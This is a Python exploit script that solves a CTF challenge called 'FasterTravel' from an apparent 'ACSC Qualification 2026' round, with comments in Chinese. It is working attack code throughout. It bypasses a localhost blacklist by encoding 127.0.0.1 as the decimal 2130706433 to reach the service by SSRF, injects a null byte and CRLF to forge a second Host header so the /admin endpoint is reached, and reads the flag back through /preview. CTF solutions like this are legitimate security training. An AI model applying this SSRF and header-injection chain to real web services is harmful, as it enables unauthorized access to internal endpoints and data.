#!/usr/bin/env python3
"""
ACSC Qualification 2026 - FasterTravel

利用思路：
1. 利用 2130706433 绕过 localhost 黑名单，SSRF 到 127.0.0.1
2. 在 source 参数中注入 %00 + CRLF，伪造第二个 Host: localhost
3. 让 /admin 误以为请求来自白名单 Host
4. 通过 /preview 读回内部响应中的 flag

脚本只使用 Python 标准库。
"""

from __future__ import annotations

import argparse
import re
import sys
import urllib.request


DEFAULT_BASE = "https://4ty7qe174n8cri3w.dyn.acsc.land"
RAW_BODY = "source=http://2130706433%00%0d%0aHost:%20localhost%0d%0aFoo:%20bar:5001/admin"


def fetch_with_redirects(request: urllib.request.Request) -> urllib.response.addinfourl:
    opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler)
    return opener.open(request, timeout=30)


def extract_flag(text: str) -> str:
    match = re.search(r"dach2026\{[^}]+\}", text)
    if not match:
        raise RuntimeError("未能在响应中提取 flag")
    return match.group(0)


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit ACSC Qualification 2026 FasterTravel")
    parser.add_argument("--base", default=DEFAULT_BASE, help="目标 URL，例如 https://host")
    args = parser.parse_args()

    base = args.base.rstrip("/")
    print(f"[+] target: {base}")

    shorten_request = urllib.request.Request(
        f"{base}/shorten",
        data=RAW_BODY.encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    with fetch_with_redirects(shorten_request) as response:
        final_url = response.geturl()
        response.read()  # 消耗响应，方便复用逻辑
    short = final_url.rsplit("/", 1)[-1]
    print(f"[+] short code: {short}")

    preview_request = urllib.request.Request(
        f"{base}/preview?short={short}",
        headers={
            "Sec-Fetch-Dest": "iframe",
            "Sec-Fetch-Site": "same-origin",
        },
    )
    with urllib.request.urlopen(preview_request, timeout=20) as response:
        preview = response.read().decode("utf-8", errors="replace")

    flag = extract_flag(preview)
    print(flag)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
